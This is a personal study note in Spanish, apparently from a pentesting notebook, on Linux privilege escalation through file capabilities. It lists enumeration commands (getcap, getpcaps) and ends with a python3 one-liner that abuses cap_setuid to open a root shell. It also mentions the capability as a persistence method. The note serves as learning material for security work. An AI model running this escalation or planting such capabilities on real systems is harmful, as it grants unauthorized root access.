Mas caps: https://gtfobins.github.io/#+capabilities
Listado de capabilities: https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/

no devuelve las  capabilities de un PID
```bash
getpcaps <PID>
```
![[Pasted image 20241015123348.png]]
listar todos los archivos con capabilities
```bash
getcap / -r 2>/dev/null
```
las capabilities mas peligrosas son las `cap_setuid+ep` que nos permite modicar nuestro UID, tambien se suele usar como forma de persistencia en un equipo

----
ejemplo util, tenemos un binario de python3
![[Pasted image 20241015123659.png]]

y vamos a darle las siguiente caps
![[Pasted image 20241015123724.png]]

ahora si estamos como otro usuario no root podemos hacer esto
![[Pasted image 20241015123759.png]]

y vemos la cap que hemos puesto antanes en el binario python3, nosotros vemos que el binario no ha cambiado nada de permisos de ni de propietario ni nada
![[Pasted image 20241015123904.png]]
pero claro nosotros ahora podemos cambiar nuestro UID
```bash
python3 -c 'import os; os.setuid(0); os.system("bash")'
```
![[Pasted image 20241015124004.png]]
y tenemos una bash de root